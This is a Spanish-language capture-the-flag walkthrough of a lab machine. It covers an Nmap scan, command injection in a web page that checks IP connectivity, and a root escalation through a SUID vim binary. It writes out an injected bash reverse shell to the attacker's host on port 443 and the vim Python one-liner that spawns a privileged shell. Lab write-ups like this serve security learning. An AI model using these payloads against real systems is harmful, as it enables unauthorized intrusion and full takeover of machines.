Escaneo  de puertos con Nmap:
```
nmap -p- -sC -sV -sS --min-rate 5000 -n -vvv -Pn 172.17.0.2 -oN escaneo
```

![](../../../Images/Pasted%20image%2020251126154051.png)

Reviso lo que corre en el único puerto abierto de esta máquina, el puerto 80 HTTP:

![](../../../Images/Pasted%20image%2020251126154213.png)

Lo que aparece es una web que trata de "verificar conectividad de una ip", probaré con una ip por ejemplo la 8.8.8.8 para ver qué sucede:

![](../../../Images/Pasted%20image%2020251126154330.png)

No aparece nada interesante, solo me devuelve la misma ip que yo coloqué

Por ende, probaré si esta web es vunerable a un *"Command Injection"* colocando el signo de punto y coma ";" seguido de un comando como por ejemplo "id", veré qué sucede:

![](../../../Images/Pasted%20image%2020251126155104.png)

Efectivamente la página me devuelve lo solicitado por el comando, entonces me doy cuenta inmediatamente que sí es vulnerable a este ataque

Procederé a explotar esta vulnerabilidad lanzándome una Reverse Shell a mi Kali poniéndome a la escucha con Netcat por el puerto 443
```
;bash -c "bash -i >& /dev/tcp/192.168.1.35/443 0>&1"
```

![](../../../Images/Pasted%20image%2020251126155516.png)

La página se queda como "pensando" y en mi Kali:

![](../../../Images/Pasted%20image%2020251126155544.png)

Recibo la conexión, ahora estoy dentro de la máquina

### Tratamiento de la TTY
```
script /dev/null -c bash 
Ctrl z
stty raw -echo; fg 
reset xterm 
export SHELL=bash
export TERM=xterm
```

![](../../../Images/Pasted%20image%2020251126160944.png)

![](../../../Images/Pasted%20image%2020251126161008.png)

## ESCALADA DE PRIVILEGIOS

Observo los binarios que contiene esta máquina:
```
find / -perm -4000 -ls 2>/dev/null
```

![](../../../Images/Pasted%20image%2020251126162742.png)

Y me llama la atención el binario Vim

Ahora miraré en GTFOBins como puedo escalar con este binario SUID:  

![](../../../Images/Pasted%20image%2020251126162632.png)

Lo ejecuto:

```
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

![](../../../Images/Pasted%20image%2020251126163200.png)

Y verifico que sea root con los 2 comandos que se muestran en la imagen, y efectivamente ya soy ROOT
